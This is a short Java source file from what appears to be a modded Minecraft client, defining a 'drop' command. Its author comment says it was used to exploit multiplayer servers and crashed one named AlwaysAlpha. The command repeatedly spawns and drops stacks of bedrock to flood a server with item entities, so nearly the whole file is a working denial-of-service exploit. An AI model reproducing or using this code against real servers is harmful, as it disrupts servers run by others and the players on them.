package me.arcanecici.client.command.impl;

import me.arcanecici.client.command.Command;
import net.minecraft.client.Minecraft;
import net.minecraft.client.blocks.Block;
import net.minecraft.client.item.impl.ItemStack;

/**
 * @author ArcaneCiCi
 * This was me testing exploiting on multiplayer servers and it worked well to my surprise, crashed AlwaysAlpha with it.
 */

public class DropCommand extends Command {

    public DropCommand() {
        super("drop");
    }

    @Override
    public void execute(String cmdName, String[] args) {
        for (int i = 0; i < 64; i++) {
            Minecraft.getMinecraft().thePlayer.inventory.addItemStackToInventory(new ItemStack(Block.bedrock, 64));
            Minecraft.getMinecraft().thePlayer.inventory.dropAllItems();
        }
    }
}
